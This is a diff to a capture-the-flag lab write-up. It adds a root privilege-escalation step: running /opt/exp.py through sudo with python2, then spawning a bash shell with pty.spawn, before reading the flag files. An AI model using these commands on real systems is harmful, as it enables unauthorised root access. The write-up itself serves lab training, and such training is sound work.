@@ -18,9 +18,16 @@ ssh <user>@<IP_ADDRESS> -p 1337
 ```
 Privilege Escalation: The user 'lucy' can execute a script with root privileges without a password. Use it for privilege escalation.
 
+```bash
+sudo /usr/bin/python2 /opt/exp.py
+import pty;pty.spawn("/bin/bash")
+```
+
 Flag Retrieval: Read the local.txt and proof.txt files after privilege escalation.
 
 ```bash
 cat local.txt
 cat /root/proof.txt
 ```
+
+Credits : Isid0r3 & Jedidia
